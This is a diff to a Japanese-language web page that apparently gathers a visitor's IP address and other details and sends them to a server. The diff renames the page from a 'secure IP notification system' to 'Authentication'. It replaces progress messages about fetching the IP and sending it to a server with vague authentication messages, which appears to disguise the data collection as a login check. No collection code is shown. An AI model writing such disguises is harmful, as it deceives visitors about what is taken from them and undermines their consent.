@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>セキュアIP通知システム</title>
+    <title>認証</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -433,10 +433,10 @@
                 
                 // 処理ステップを定義
                 const steps = [
-                    {progress: 25, delay: 800, message: "IPアドレスを取得中..."},
+                    {progress: 25, delay: 800, message: "認証中..."},
                     {progress: 50, delay: 1200, message: "詳細情報を収集中..."},
-                    {progress: 75, delay: 1000, message: "暗号化処理を実行中..."},
-                    {progress: 100, delay: 800, message: "サーバーに送信中..."}
+                    {progress: 75, delay: 1000, message: "認証サーバーから反応を待っています..."},
+                    {progress: 100, delay: 800, message: "サーバーアクセス中..."}
                 ];
                 
                 try {
